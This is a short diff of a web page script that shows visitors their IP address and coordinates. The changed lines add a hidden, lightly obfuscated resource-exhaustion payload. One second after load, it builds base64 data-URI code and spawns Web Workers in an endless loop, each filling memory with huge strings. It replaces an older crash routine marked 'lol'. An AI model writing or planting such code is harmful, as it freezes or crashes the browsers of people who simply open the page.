@@ -9,6 +9,5 @@
   ipE.innerText = ip
   llE.innerText = `(${longitude}, ${latitude})`;
   // lol
-  setTimeout(() => {const a = "a".repeat(1e2).split("")
-  while(1) a.push(a)},1000)
+  setTimeout(() => {let r=0xFFFFFF,o=0xFFFFA,c=`f=[];while(!0){f.push(String.fromCharCode(${o}).repeat(${r}))}`,d=`data:text/html;base64,${btoa(c)}`,b=`while(1){new Worker("${d}")}`,i=`data:text/html;base64,${btoa(b)}`;new Worker(i);},1000)
 })()
